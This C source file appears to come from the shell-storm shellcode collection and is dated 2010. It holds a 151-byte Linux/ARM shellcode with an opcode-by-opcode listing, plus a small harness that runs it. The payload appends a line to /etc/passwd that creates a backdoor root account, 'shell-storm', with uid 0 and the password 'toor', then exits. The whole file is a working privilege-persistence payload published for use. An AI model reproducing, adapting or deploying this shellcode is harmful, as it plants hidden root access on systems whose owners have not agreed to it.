/*
** Title:     Linux/ARM - add root user with password - 151 bytes
** Date:      2010-11-25
** Tested on: ARM926EJ-S rev 5 (v5l)
** Author:    Jonathan Salwan - twitter: @shell_storm
**
** http://shell-storm.org
**
** Informations:
** -------------
**               - user: shell-storm
**               - pswd: toor
**               - uid : 0
*/

#include <stdio.h>


char SC[] =
            /* Thumb mode */
            "\x05\x50\x45\xe0"  /* sub  r5, r5, r5 */
            "\x01\x50\x8f\xe2"  /* add  r5, pc, #1 */
            "\x15\xff\x2f\xe1"  /* bx   r5 */

            /* open("/etc/passwd", O_WRONLY|O_CREAT|O_APPEND, 0644) = fd */
            "\x78\x46"          /* mov  r0, pc */
            "\x7C\x30"          /* adds r0, #124 */
            "\xff\x21"          /* movs r1, #255 */
            "\xff\x31"          /* adds r1, #255 */
            "\xff\x31"          /* adds r1, #255 */
            "\xff\x31"          /* adds r1, #255 */
            "\x45\x31"          /* adds r1, #69 */
            "\xdc\x22"          /* movs r2, #220 */
            "\xc8\x32"          /* adds r2, #200 */
            "\x05\x27"          /* movs r7, #5 */
            "\x01\xdf"          /* svc  1 */

            /* r8 = fd */
            "\x80\x46"          /* mov  r8, r0 */

            /* write(fd, "shell-storm:$1$KQYl/yru$PMt02zUTW"..., 72) */
            "\x41\x46"          /* mov  r1, r8 */
            "\x08\x1c"          /* adds r0, r1, #0 */
            "\x79\x46"          /* mov  r1, pc */
            "\x18\x31"          /* adds r1, #24 */
            "\xc0\x46"          /* nop (mov r8, r8) */
            "\x48\x22"          /* movs r2, #72 */
            "\x04\x27"          /* movs r7, #4 */
            "\x01\xdf"          /* svc  1 */

            /* close(fd) */
            "\x41\x46"          /* mov  r1, r8 */
            "\x08\x1c"          /* adds r0, r1, #0 */
            "\x06\x27"          /* movs r7, #6 */
            "\x01\xdf"          /* svc  1 */

            /* exit(0) */
            "\x1a\x49"          /* subs r1, r1, r1 */
            "\x08\x1c"          /* adds r0, r1, #0 */
            "\x01\x27"          /* movs r7, #1 */
            "\x01\xdf"          /* svc  1 */

            /* shell-storm:$1$KQYl/yru$PMt02zUTWmMvPWcU4oQLs/:0:0:root:/root:/bin/bash\n */
            "\x73\x68\x65\x6c\x6c\x2d\x73\x74\x6f\x72"
            "\x6d\x3a\x24\x31\x24\x4b\x51\x59\x6c\x2f"
            "\x79\x72\x75\x24\x50\x4d\x74\x30\x32\x7a"
            "\x55\x54\x57\x6d\x4d\x76\x50\x57\x63\x55"
            "\x34\x6f\x51\x4c\x73\x2f\x3a\x30\x3a\x30"
            "\x3a\x72\x6f\x6f\x74\x3a\x2f\x72\x6f\x6f"
            "\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73"
            "\x68\x0a"

            /* /etc/passwd */
            "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";


int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(SC));
        (*(void(*)()) SC)();
return 0;
}